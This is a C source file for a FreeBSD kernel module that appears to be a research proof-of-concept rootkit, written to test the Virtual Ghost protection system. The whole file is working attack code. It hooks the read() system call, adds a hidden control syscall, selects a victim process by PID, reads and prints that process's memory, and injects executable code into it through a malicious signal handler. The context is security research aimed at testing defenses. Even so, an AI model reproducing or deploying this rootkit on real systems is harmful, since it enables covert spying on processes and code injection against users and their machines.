/*===- rootkit.c - Example Rootkit =---------------------------------------===
 * 
 *                        Example Virtual Ghost Rootkit
 *
 * This file was developed by the LLVM research group and is distributed under
 * the University of Illinois Open Source License. See LICENSE.TXT for details.
 * 
 *===----------------------------------------------------------------------===
 *
 * This file implements a proof of concept rootkit which tries to attack
 * applications on the Virtual Ghost system.
 *
 * This code is based on the examples in Designing BSD Rootkits by Joseph Kong.
 *
 *===----------------------------------------------------------------------===
 */

#include <sys/fcntl.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/mman.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/sx.h>

#include "rootkit/rootkit.h"
#include "rootkit/rkconfig.h"

//
// Design:
//  1) Find designated target process
//  2) Spy on its I/O
//  3) Attempt to run new code within the process
//  4) Attempt to directly read application data
//

// Signal to use for the attack
static const int attackSig = SIGUSR1;

// Target process to attack
struct proc * victimProc = 0;

// Flags whether malicous code has been injected
unsigned char injected = 0;

// Flags which attack should be attempted next
unsigned char attackType = 0;

// The virtual address to use in the attack
unsigned char * victimAddr;

// The length of data to read/modify in the attack
uintptr_t victimLen;

// Previous system call
void * oldRead;

//
// Function: isVictimThread()
//
// Description:
//  Determines whether the specified thread is the thread that we are
//  attacking.
//
// Return value:
//  true  - The thread belongs to the process that we are attacking.
//  false - The thread belongs to a process that we are not attacking.
//
static inline unsigned char
isVictimThread (struct thread * td) {
  if ((victimProc) && (td->td_proc == victimProc))
    return 1;
  return 0;
}

static void *
insertMaliciousCode (struct thread * td) {
  //
  // Allocate some memory within the victim process.
  //
  int error;
  struct mmap_args args;
  args.addr = 0;
  args.len = 4096;
  args.prot = PROT_READ | PROT_WRITE | PROT_EXEC;
  args.flags = MAP_ANON;
  args.fd = -1;
  args.pos = 0;
  error = sys_mmap (td, &args);
  printf ("Rootkit: error = %d: memory at %lx\n", error, td->td_retval[0]);

  //
  // Install malicious code into the allocated memory.
  //
  extern unsigned char badcode;
  extern unsigned char endcode;
  printf ("Rootkit: 1: copyout: %p %p %lx\n", badcode, td->td_retval[0], &endcode - &badcode);
  error = copyout (&badcode, td->td_retval[0], &endcode - &badcode); 
  printf ("Rootkit: 2: copyout: %d: %p %p %lx\n", error, &badcode, td->td_retval[0], &endcode - &badcode);

  //
  // Mark that we've inserted the malicious code.
  //
  injected = 1;
  return td->td_retval[0];
}

//
// Function: setMaliciousHandler ()
//
// Description:
//  Modify the specified thread so that it has a signal handler at the
//  specified location.
//
static void
setMaliciousHandler (struct thread * td, void * handler) {
  struct sigaction action;

  //
  // Initialize the arguments.
  //
  bzero (&action, sizeof (struct sigaction));
  action.sa_handler = handler;

  //
  // Install the signal handler for the victim thread.
  //
  kern_sigaction (td, attackSig, &action, NULL, 0);
}

//
// Function: attackThread ()
//
// Description:
//  Perform the actual attack on the specified thread.
//
static void
attackThread (struct thread * td) {
  //
  // Send a signal to the process to trigger the exploit code.
  //
  tdsignal (td, attackSig);
  return;
}

//
// Function: doAttack ()
//
// Description:
//  Attack!!!!
//
static void
doAttack (struct thread * td) {
  // Return value
  int ret = 0;
  printf ("Rootkit: doAttack: type = %d\n", attackType);
  switch (attackType) {
    // Direct read attack
    case at_read: {
      printf ("Rootkit: doAttack: Read Attack\n");
      static char buffer[4096];
      __asm__ __volatile__ ("nop\n");
      memcpy (buffer, victimAddr, victimLen);
      if (ret == EFAULT) {
        printf ("Rootkit: EFAULT at %lx\n", victimAddr);
      } else {
        unsigned index = 0;
        printf ("Rootkit: Secret is");
        for (index = 0; index < SIZE; ++index) {
          printf ("%c", buffer[index]);
        }
        printf ("\n");
      }
      break;
    }

    // MMU attack
    case at_mmu:
      printf ("Rootkit: doAttack: MMU Attack\n");
      break;

    // Signal handler attack
    case at_sig: {
      printf ("Rootkit: doAttack: Signal Attack\n");
      void * handler = insertMaliciousCode (td);
      setMaliciousHandler (td, handler);
      attackThread (td);
      break;
    }

    default:
      break;
  }

  return;
}

//
// Function: command_hook()
//
// Description:
//  This is a system call that we provide to allow a user-space process to
//  control the rootkit.  It provides services such as configuring the victim
//  process to attack.
//
static int
command_hook (struct thread * td, void * syscall_args) {
  // System call arguments
  struct config_args {
    // Victim process ID
    uintptr_t victimPID;

    // Identifier for the type of attack to perform
    uintptr_t attackType;

    // The virtual address to use in the attack
    unsigned char * victimAddr;

    // The length of data to read/modify in the attack
    uintptr_t victimLen;
  };

  //
  // Find the victim process that we want to attack.  A victim PID of zero
  // mean that we don't want to attack any process.
  //
  // Note that pfind() locks the process, so we want to unlock it.
  //
  struct config_args * argsp = (struct config_args *)(syscall_args);
  pid_t victimPID = argsp->victimPID;
  printf ("rootkit: Looking for process %d\n", victimPID);

  sx_slock(&allproc_lock);
  LIST_FOREACH(victimProc, PIDHASH(victimPID), p_hash)
  if (victimProc->p_pid == victimPID) {
    break;
  }
  sx_sunlock(&allproc_lock);

  //
  // Set the attack type.
  //
  attackType = argsp->attackType;

  //
  // Record other attack parameters
  //
  victimAddr = argsp->victimAddr;
  victimLen = argsp->victimLen;
  printf ("rootkit: Victim process %p: Attack %d\n", victimProc, attackType);
  printf ("rootkit: Victim address %p len %lx\n", victimAddr, victimLen);
  return 0;
}

//
// Function: read_hook()
//
// Description:
//  This function intercepts the read() system call.  Its job is to swipe data
//  read from the application.
//
static ssize_t
read_hook (struct thread * td, void * syscall_args) {
  //
  // If this is the victim process, and we have not injected code yet,
  // inject the code.
  //
  if (isVictimThread (td)) {
    printf ("Rootkit: About to perform attack on thread %p\n", td);
    doAttack (td);
  }

  //
  // Perform the read using the original system call.
  //
  return (sys_read (td, syscall_args));
}

static void
initializeRootkit (void) {
  // Add a system call to control the rootkit
  sysent[11].sy_call = (sy_call_t *) command_hook;
  sysent[11].sy_narg = 1;
  sysent[11].sy_thrcnt = SY_THR_STATIC;

  // Intercept the read system call
  oldRead = sysent[SYS_read].sy_call;
  sysent[SYS_read].sy_call = (sy_call_t *) read_hook;

  // Mark that we have no active victim
  victimProc = 0;
  injected = 0;
  return;
}

static void
unloadRootkit (void) {
  //
  // Restore all hooked system calls.
  //
  sysent[SYS_read].sy_call = (sy_call_t *) oldRead;
  sysent[11].sy_call = (sy_call_t *) nosys;
  sysent[11].sy_narg = 0;
  sysent[11].sy_thrcnt = SY_THR_ABSENT;
}

//
// Function: load()
//
// Description:
//  This function is called by the kernel when loading and unloading the
//  module.  This function should initialize the module to do our evil bidding.
//
static int
load (struct module * module, int cmd, void * arg) {
  int error = 0;

  switch (cmd) {
    case MOD_LOAD:
      initializeRootkit();
      uprintf ("Rootkit: Loaded: %p\n", load);
      break;

    case MOD_UNLOAD:
      unloadRootkit();
      uprintf ("Rootkit: Removed\n");
      break;

    default:
      error = EOPNOTSUPP;
      break;
  }

  return error;
}

static moduledata_t rootkit_mod = {
  "rootkit",
  load,
  0
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
